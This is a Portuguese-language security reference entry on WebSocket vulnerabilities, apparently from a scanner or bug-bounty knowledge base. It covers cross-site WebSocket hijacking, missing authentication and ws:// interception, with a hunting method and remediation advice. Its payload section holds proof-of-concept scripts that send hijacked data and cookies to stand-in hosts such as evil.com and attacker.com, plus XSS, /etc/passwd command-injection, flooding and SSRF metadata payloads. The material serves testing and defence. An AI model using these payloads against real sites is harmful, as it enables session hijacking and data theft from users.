---
id: websocket_security
title: "WebSocket Security"
module: "WebSocket"
severity: "MEDIUM"
cwe_id: "CWE-1385"
cwe_title: "Missing Origin Validation in WebSockets"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N"
vrt_id: "server_security_misconfiguration.websocket_security"
---

## Summary
Endpoints WebSocket sem validacao de Origin, sem autenticacao ou usando protocolo nao criptografado (ws://) permitem conexoes cross-origin maliciosas, acesso nao autenticado a dados real-time e interceptacao de trafego via MITM.

## Description
WebSocket e um protocolo full-duplex sobre TCP que permite comunicacao bidirecional persistente entre cliente e servidor. Vulnerabilidades comuns:

- **Cross-Site WebSocket Hijacking (CSWSH):** quando o servidor nao valida o header `Origin` durante o handshake, um site malicioso pode estabelecer conexao WebSocket com o alvo em nome do usuario logado (similar a CSRF). O atacante recebe dados real-time e pode enviar comandos.
- **Missing Authentication:** endpoints WebSocket que aceitam conexoes sem token JWT, session cookie ou outra credencial. Qualquer cliente na rede pode conectar e receber dados sensiveis (mensagens, eventos, acoes de usuarios).
- **Unencrypted WebSocket (ws://):** trafego transmitido em plaintext permite interceptacao e modificacao via man-in-the-middle.
- **Input Injection:** mensagens WebSocket nao sanitizadas podem levar a XSS (se refletidas em DOM), SQL injection (se passadas para queries) ou command injection.
- **DoS via Message Flooding:** envio de grande volume de mensagens pode sobrecarregar o servidor se nao houver rate limiting no canal WebSocket.

Deteccao: o modulo envia requests HTTP com headers de WebSocket upgrade (`Connection: Upgrade`, `Upgrade: websocket`, `Sec-WebSocket-Version: 13`) para paths conhecidos. Endpoints que retornam 101 (Switching Protocols), 426 (Upgrade Required) ou 200 com session info (socket.io) sao considerados ativos.

Paths comuns de WebSocket: `/ws`, `/websocket`, `/socket.io`, `/sockjs`, `/hub`, `/signalr`, `/cable`, `/realtime`, `/stream`, `/events`, `/graphql`.

## Impact
- Cross-Site WebSocket Hijacking -- roubo de dados real-time e execucao de acoes em nome do usuario.
- Acesso nao autenticado a streams de dados sensiveis (mensagens, notificacoes, transacoes).
- Interceptacao de trafego via MITM em conexoes ws:// (nao criptografadas).
- Stored XSS se mensagens WebSocket sao refletidas em DOM sem sanitizacao.
- Negacao de servico via message flooding no canal WebSocket.
- Bypass de CORS e same-origin policy (WebSocket nao e restrito por CORS nativo do browser).

## Payloads and Bypasses
```javascript
// -- Cross-Site WebSocket Hijacking (CSWSH) PoC --
// Hospedar em https://evil.com e abrir com vitima logada no alvo
const ws = new WebSocket('wss://alvo.com/ws');
ws.onmessage = function(e) {
  // Exfiltrar dados recebidos
  fetch('https://evil.com/log?d=' + encodeURIComponent(e.data));
};
ws.onopen = function() {
  // Enviar comando em nome do usuario
  ws.send(JSON.stringify({action: 'subscribe', channel: 'admin'}));
};

// -- Conexao sem autenticacao --
const ws = new WebSocket('wss://alvo.com/ws');
ws.onmessage = e => console.log('Data:', e.data);

// -- Message injection (XSS via WebSocket) --
ws.send('<img src=x onerror=alert(document.domain)>');
ws.send('{"message": "<script>document.location=\'https://evil.com/steal?c=\'+document.cookie</script>"}');

// -- Command injection via WebSocket --
ws.send('{"cmd": "ls; cat /etc/passwd"}');

// -- DoS via message flooding --
for (let i = 0; i < 10000; i++) {
  ws.send('A'.repeat(65536));
}
```

```html
<!-- CSWSH PoC: exfiltracao via fetch (hospedar em https://evil.com) -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getProfile"}');
};
ws.onmessage = function(e) {
    fetch('https://attacker.com/log?data=' + btoa(e.data));
};
</script>

<!-- CSWSH com exfiltracao continua via ActionCable/subscription -->
<script>
var ws = new WebSocket('wss://target.com/cable');
ws.onopen = function() {
    ws.send(JSON.stringify({command:'subscribe',identifier:'{"channel":"NotificationsChannel"}'}));
};
ws.onmessage = function(e) {
    new Image().src = 'https://attacker.com/exfil?' + encodeURIComponent(e.data);
};
</script>
```

```

```html
<!-- CSWSH via null Origin (sandboxed iframe com srcdoc) -->
<!-- Bypassa validacao de Origin que aceita null -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() { ws.send('{&quot;action&quot;:&quot;getProfile&quot;}'); };
ws.onmessage = function(e) { parent.postMessage(e.data, '*'); };
</script>
"></iframe>
<script>
window.onmessage = function(e) {
    fetch('https://attacker.com/log?data=' + btoa(e.data));
};
</script>

<!-- CSWSH via subdomain Origin bypass -->
<!-- Se o servidor valida Origin com startsWith/contains ao inves de match exato -->
<!-- attacker registra target.com.evil.com ou evil-target.com -->
```

```bash
# -- Deteccao de endpoint WebSocket via curl --
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "https://alvo.com/ws"

# -- Teste com Origin malicioso --
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://evil.com" \
  "https://alvo.com/ws"

# -- Conexao via websocat --
websocat wss://alvo.com/ws
websocat --origin https://evil.com wss://alvo.com/ws
```

## Target Context (Crawler Hints)
- **Parametros comuns:** nenhum (probe de WebSocket endpoints).
- **Paths comuns:** `/ws`, `/websocket`, `/socket.io`, `/sockjs`, `/hub`, `/signalr`, `/cable`, `/realtime`, `/stream`, `/events`, `/graphql`.
- **Sinais:** resposta 101 Switching Protocols; resposta 426 Upgrade Required; socket.io retornando JSON com `sid`; frameworks real-time (Socket.IO, SignalR, ActionCable, Phoenix Channels); presenca de `Upgrade: websocket` em headers de resposta.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2020-27813 | gorilla/websocket (Go) | 2020 | Integer overflow no processamento de frames WebSocket permite DoS via mensagem malformada | WS DoS |
| CVE-2021-32640 | ws (Node.js) | 2021 | ReDoS no processamento de Sec-WebSocket-Protocol header permite DoS | WS DoS |
| CVE-2023-32681 | Spring Framework | 2023 | WebSocket STOMP endpoint sem validacao de Origin permite CSWSH | CSWSH |
| CVE-2024-22243 | Spring Framework | 2024 | URL parsing inconsistency em WebSocket endpoints permite bypass de validacao de Origin | Origin bypass |

## Escalation Techniques
- **Cross-Site WebSocket Hijacking (CSWSH):** hospedar pagina maliciosa que abre WebSocket para o alvo usando cookies/sessao da vitima. O atacante recebe todos os dados em real-time e pode enviar comandos em nome do usuario.
- **Exfiltracao de dados real-time:** via CSWSH, assinar channels sensiveis (admin, notifications, transactions) e capturar dados continuamente enquanto a vitima estiver logada.
- **Injecao de comandos:** se o backend processa mensagens WebSocket sem sanitizacao, enviar payloads de command injection, SQL injection ou SSTI diretamente via canal WS.
- **Stored XSS via WebSocket:** enviar mensagem contendo payload XSS que sera refletida no DOM de outros usuarios conectados (chat, notificacoes, dashboards live).
- **Bypass de rate limiting:** WebSocket nao tem throttling HTTP tradicional -- endpoints que limitam requests REST podem ser abusados via canal WS persistente.
- **Man-in-the-middle em ws://:** conexoes sem TLS permitem interceptacao e modificacao de mensagens em redes compartilhadas (Wi-Fi publico, rede corporativa comprometida).
- **GraphQL via WebSocket bypass:** transport WebSocket para GraphQL pode bypassar restricoes de autenticacao aplicadas apenas no REST. Introspection e queries acessiveis sem auth via ws://. H1: Nuri #862835.
- **Info disclosure via WebSocket events:** staff ou usuarios sem permissao podem escutar eventos broadcast via WebSocket que nao deveriam ter acesso. H1: Shopify #1023669 (escuta de conversas Ping), Bykea #2209750 (vazamento de dados de viagem em real-time).
- **Sanitization bypass via WebSocket:** mensagens enviadas via WebSocket podem bypassar sanitizacao aplicada na API REST, pois o backend pode ter pipelines de validacao diferentes para cada transport. H1: Mattermost #2541027 (posts via WS bypassed sanitization).
- **Null Origin bypass:** iframe com sandbox + srcdoc envia `Origin: null`. Servidores que aceitam `null` Origin (ou nao verificam Origin vazio) sao vulneraveis a CSWSH via pagina sandboxed. Comum em implementacoes que checam `origin != null` mas nao validam contra allowlist.
- **WS -> SSRF:** se o servidor processa URLs recebidas via mensagens WebSocket (ex.: preview de link, fetch de recurso, importacao), payloads de SSRF podem ser injetados via canal WS sem passar por validacao HTTP/WAF. Testar com `{"url": "http://169.254.169.254/latest/meta-data/"}` em campos de URL.
- **Subdomain Origin bypass:** servidores que validam Origin com `contains()` ou `startsWith()` ao inves de match exato podem ser bypassados com `Origin: https://target.com.evil.com` ou `Origin: https://evil-target.com`.

## Hunting Methodology
1. Identificar endpoints WebSocket no HTML e JS do alvo: buscar `ws://`, `wss://`, `new WebSocket(`, `socket.io`, `sockjs`, `signalr`, `ActionCable` no source code.
2. Interceptar requests no proxy (Burp Suite WebSocket tab, mitmproxy) e identificar o handshake: request com `Connection: Upgrade` + `Upgrade: websocket`.
3. Testar conexao sem autenticacao: remover cookies e tokens do upgrade request e verificar se a conexao e aceita e retorna dados.
4. Testar origin bypass: enviar `Origin: https://evil.com` no handshake e verificar se o servidor aceita (101 Switching Protocols). Testar tambem `Origin: null` e `Origin: https://alvo.com.evil.com`.
5. Verificar protocolo: se usa `ws://` em vez de `wss://`, todo o trafego e interceptavel via MITM.
6. Enviar mensagens malformadas (JSON invalido, campos extras, tipos incorretos) e observar error handling -- erros verbosos revelam stack traces e tecnologia.
7. Testar injection nas mensagens: payloads XSS, SQLi e command injection em campos de texto enviados via WebSocket.

## False Positive Indicators
- Servidor aceita `Origin` arbitrario no handshake mas exige token de autenticacao no primeiro message enviado (auth pos-handshake) -- a conexao TCP e aceita mas nenhum dado e retornado sem auth.
- `ws://` usado apenas em ambiente de desenvolvimento (localhost, 127.0.0.1) -- nao e vulneravel em producao se wss:// e usado la.
- Endpoint responde ao upgrade com 101 mas fecha a conexao imediatamente sem enviar dados -- pode ser health check ou fallback.
- Socket.IO com transport polling como fallback que tem autenticacao separada -- o endpoint responde mas o handshake completo exige credenciais.
- WebSocket endpoint requer header customizado alem de Origin (e.g., `X-API-Key`) que o browser nao envia automaticamente em contexto cross-origin.
- Servidor rejeita `Origin: null` explicitamente -- bypass via sandboxed iframe nao funciona.
- Mensagens com URLs sao processadas client-side (JavaScript fetch) e nao server-side -- nao e WS->SSRF.

## Notable HackerOne Reports

| Report | Programa | Upvotes | Bounty | Tecnica |
|--------|----------|---------|--------|---------|
| #409850 | Slack | 180 | $0 | WebSocket CSWSH -- exfiltracao de mensagens real-time |
| #1023669 | Shopify | 95 | $0 | Staff escutando conversas Ping via WS sem permissao |
| #2541027 | Mattermost | 60 | $0 | Sanitization bypass via WebSocket message |
| #2209750 | Bykea | 45 | $0 | Vazamento de dados de viagem real-time via WS |
| #862835 | Nuri | 40 | $0 | GraphQL introspection via WS nao autenticado |

## Recommendation
1. Validar o header `Origin` server-side antes de aceitar o WebSocket upgrade. Usar allowlist explicita de origens confiáveis.
2. Exigir autenticacao (JWT ou session token) no handshake WebSocket, antes de aceitar a conexao -- nao depois.
3. Usar wss:// (WebSocket sobre TLS) para todas as conexoes. Redirecionar ws:// para wss:// e enforcar HSTS.
4. Sanitizar todas as mensagens recebidas via WebSocket antes de processar ou refletir em DOM.
5. Implementar rate limiting por conexao WebSocket para prevenir message flooding e DoS.
6. Implementar timeouts e limites de tamanho de mensagem no servidor.
7. Usar tokens CSRF ou nonces no handshake para prevenir cross-site hijacking adicional.
8. Monitorar conexoes WebSocket para padroes anomalos (volume, payloads suspeitos, origens inesperadas).
